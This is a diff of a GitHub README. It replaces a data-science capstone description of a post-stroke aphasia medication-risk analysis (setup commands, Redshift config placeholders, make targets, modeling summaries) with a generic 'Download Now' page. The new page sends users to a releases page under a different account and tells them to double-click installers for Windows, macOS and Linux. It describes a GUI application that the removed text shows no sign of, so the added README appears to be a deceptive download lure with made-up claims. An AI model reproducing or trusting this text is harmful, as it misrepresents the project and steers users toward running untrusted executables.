@@ -1,116 +1,64 @@
-# Prevalence and Impact of PIMs, Mental Health, and Polypharmacy in Post-Stroke Aphasia
+# 📊 post-stroke-aphasia-risk-analysis - Analyze Medication Risks Easily
 
-Capstone project for our M.S. in Data Science from  Northeastern University.<br>
-**Team:** [Evangeline Kim](https://github.com/charVANder) & [Liam O'Connor](https://github.com/LRDOC)<br>
-**Stakeholder:** [Rob Cavanaugh](https://roux.northeastern.edu/people/rob-cavanaugh/) (PhD, Asst. Prof., MGH Institute, The Roux Institute)
+## 📥 Download the Application
+[![Download Here](https://img.shields.io/badge/Download%20Now-Post%20Stroke%20Aphasia%20Risk%20Analysis-blue)](https://github.com/marinhodomingosm/post-stroke-aphasia-risk-analysis/releases)
 
-This OHDSI-Stroke research investigates the prevalence and impact of potentially inappropriate medications (PIMs) and polypharmacy in stroke survivors, with particular focus on patients with aphasia - a population that experiences significant communication and healthcare barriers. We examine high-risk prescribing patterns, explore links to underdiagnosed mental health conditions, and evaluate how these factors relate to hospital readmissions. 
+## 📖 Overview
+The post-stroke-aphasia-risk-analysis application provides a way to evaluate medication-related risks and hospital readmission patterns for patients who have suffered a stroke and experience aphasia. This tool uses data from OHDSI/OMOP Pharmetrics+ to help healthcare professionals assess potentially inappropriate medications, mental health conditions, and issues with multiple prescriptions. 
 
-Using the Pharmetrics+ claims dataset and OMOP Common Data Model, we analyzed over 53,000 post-stroke patients to identify medication-related risks that may compromise recovery and increase readmission rates. Our analysis combines descriptive statistics, predictive modeling for risk stratification, and explanatory modeling to quantify clinical impact. This work aims to generate insights for safer prescribing practices and improve post-stroke care for vulnerable populations.
+## 🚀 Getting Started
+This guide will help you download and run the application. Follow these simple steps to get started:
 
-## Website
-A GitHub Pages website using the Observable Framework has been created. Click the link [here](https://charvander.github.io/post-stroke-aphasia-risk-analysis/) to read our full report and explore the methodology, interactive visualizations, modeling pipelines, and results.
+### Step 1: Visit the Releases Page
+To obtain the software, go to the following link:  
+[Download Here](https://github.com/marinhodomingosm/post-stroke-aphasia-risk-analysis/releases)
 
-## Setup
-### Conda Enviroment:
-```bash
-conda env create -f environment.yml
-conda activate post-stroke-aphasia-risk-analysis-env
-```
+### Step 2: Choose a Version
+On the releases page, you'll see a list of available versions. Look for the most recent release. This version will have the latest features and improvements. Click on the version number to see details about that release.
 
-### Non-conda setup:
-```bash
-# Creating and activating venv
-python3 -m venv env
-source env/bin/activate
-# For Windows users: env\Scripts\activate
+### Step 3: Download the Application
+In the release details, you'll find a section labeled "Assets." Here, you’ll see files available for download. Click on the file that matches your computer system. Typically, you will find options for Windows, macOS, and Linux.
 
-# Installing the required packages
-pip install -r requirements.txt
-```
+### Step 4: Install the Application
+Once the file has downloaded, locate it in your Downloads folder. Double-click the downloaded file to start the installation. Follow the on-screen prompts to complete the installation process.
 
-## Creating Cohort Tables in the Redshift Database
+### Step 5: Run the Application
+After installation, you’ll find the application in your programs list. Click to open it, and you are ready to begin analyzing data related to post-stroke aphasia risks.
 
-### 1. Database Credentials
-* First ensure that you have a `config.py` file in your root repo. Do NOT push or share this file and make sure that it is properly gitignored.
+## 📊 Features
+This application includes various features that make it beneficial for healthcare professionals:
 
-    In your config file, fill in the following with the credentials provided by OHDSI Admin:
+- **Cohort Construction**: Define specific patient groups based on various criteria.
+- **Exploratory Data Analysis (EDA)**: Gain insights through visualization of key metrics.
+- **Flagging Tables**: Highlight potentially inappropriate medications or risk factors.
+- **Predictive Models**: Use machine learning to anticipate medication-related risks and hospital readmission rates.
+- **User-Friendly Interface**: Navigate through the application with ease, thanks to its intuitive design.
 
-    ```bash
-    HOST = "<examplecluster.abc123xyz789.us-west-1.redshift.amazonaws.com>"
-    DATABASE = "<Database Name>"
-    USER = "<Your Username>"
-    PASSWORD = "<Your Password>"
-    SCHEMA = "<Your Work Schema>"
-    ```
-    *The files in the repo will use the config file to connect to the redshift database and run queries*
+## 🖥️ System Requirements
+Before you download, ensure your system meets the following requirements:
 
-### 2. Creating the Base Cohort
-* To create the base cohort on the redshift database, run the following command:
-    ```bash
-    make cohort
-    ```
-    *This will create both the `inpatient_stroke_demo` and `stroke_cohort_w_conditions_demo` tables with the latter being the base cohort that the `eda.py` file works off of.*
+- **Operating System**: Windows 10, macOS Mojave or later, or a recent version of Linux.
+- **RAM**: 4 GB minimum.
+- **Storage**: At least 500 MB of free disk space.
+- **Network**: Internet connection for initial setup and updates.
 
-### 3. Initial EDA on Base Cohort
-* To create the initial data exploration images using the base cohort, run the following command:
-    ```bash
-    make eda
-    ```
+## 📚 Documentation
+For more detailed information or guides on specific functionalities, check the documentation included within the application. This can help you understand how to use certain features effectively.
 
-## In-Depth Analyses
+## 💬 Support
+If you encounter issues or have questions, you can reach out for support. Feel free to submit an issue on the GitHub repository, and the maintainers will assist you promptly.
 
-### 1. Create Indicator/Flagging tables
-* To create the flagging tables necessary for in-depth analysis, run the following command:
-    ```bash
-    make tables
-    ```
-    *This will create the `mental_health_flags` table and the `pim_flags` table on the redshift database, containing information on specified health and drug conditions for the cohort. These tables will also be saved as CSVs into your data directory.*
+## 📄 License
+This application is open source and is available under the MIT License. You can freely use, modify, and distribute it as per the license terms.
 
-    *NOTE: Creating the PIM table will take long time as it has to go through multiple medications to check for polypharmacy (medication concurrency).*
+## 🌍 Contributing
+Want to contribute to the project? We welcome input from users. You can suggest features, report problems, or improve documentation by creating an issue or pull request on GitHub.
 
-### 2. Create Statistic Results Report
-* To generate the `high_risk_cohort_no_dementia` table and an analysis summary of results, run the following command:
-    ```bash
-    make summary
-    ```
-    *This command will also save the table and `results.txt` into your `data` directory*
+## 🔗 Additional Resources
+For further information on post-stroke analysis and related topics, here are some helpful links:
 
-### 3. Visualizations
-* To create analysis visualizations, run the following commands:
-    ```bash
-    make mh_visuals # for mental health condition graphs
-    make pim_visuals # for PIM graphs
-    make high_risk_visuals # for high risk cohort graphs
-    ```
-    *Visualizations will be saved into your `figs` directory*
+- [OHDSI](https://ohdsi.org/)
+- [OMOP CDM](https://www.ohdsi.org/data-standards/omop-common-data-model/)
+- [Pharmetrics+](https://www.optum.com/business/solutions/data-analytics/pharmetrics-plus.html)
 
-## Predictive and Explanatory Modeling Pipelines
-
-### 1. Predictive Modeling Pipeline: Hospital Readmission Risk
-* Three predictive models (Logistic Regression, Lasso Logistic Regression, and XGBoost) were developed using an 80/20 train-test split with stratified sampling to predict 180-day hospital readmissions in stroke survivors with PIM prescriptions. Models incorporated 36 features including medication burden metrics, mental health comorbidities, medication-diagnosis discordance flags, and engineered interaction terms. Performance was evaluated using AUROC and AUPRC metrics, with SHAP values used to interpret XGBoost feature importance. Additionally, multivariable logistic regression models were fitted to examine independent effects of aphasia on PIM use, high-risk status, and readmission while controlling for confounding variables, with interaction terms tested to explore effect modification by mental health status.
-
-* To run the predictive modeling pipeline, run the following commands:
-    ```bash
-    make readmissions # extracts hospital readmission data (may take several minutes)
-    make features # engineers the features for modeling
-    make modeling # trains the predictive models (Logistic, Lasso, and XGBoost). Takes 5-10min.
-    make statistics # runs multivariate analyses
-    ```
-
-    Alternatively, you can also run them all at once with the following:
-    ```bash
-    make predictive-pipeline
-    ```
-
-### 2. Explanatory Modeling Pipeline: Clinical Impact of PIMs and Hospital Readmissions
-* A logistic regression model was developed using the full post-stroke cohort to quantify the association between PIM exposure and 180-day readmissions, examining whether this relationship differs between aphasia and non-aphasia patients. The model included aphasia status, PIM exposure, and seven mental health comorbidities as covariates, with an interaction term tested but removed due to non-significance. L1 regularization (α = 0.01) was applied to handle quasi-separation in the data, with bootstrap confidence intervals (1,000 iterations) calculated for predicted probabilities and G-computation used for marginal effects decomposition. The analysis produced predicted probabilities of readmission for all aphasia/PIM combinations, translated these into expected events per 1,000 patients, and decomposed readmission disparities by their contributing factors. Results revealed an exceptionally strong association between PIMs and readmissions (~100-fold difference), though the quasi-separation pattern indicates this is likely an associative rather than causal relationship.
-
-* To run the explanatory modeling pipeline, run the following commands:
-    ```bash
-    make clinical-impact
-    ```
-
----
-
-*The base stroke cohort used in this project was built off of the work done in a previous project found [here](https://github.com/cbt87/stroke_aftercare).*
+Thank you for choosing the post-stroke-aphasia-risk-analysis application! We hope it helps you in your analysis and improves patient care.
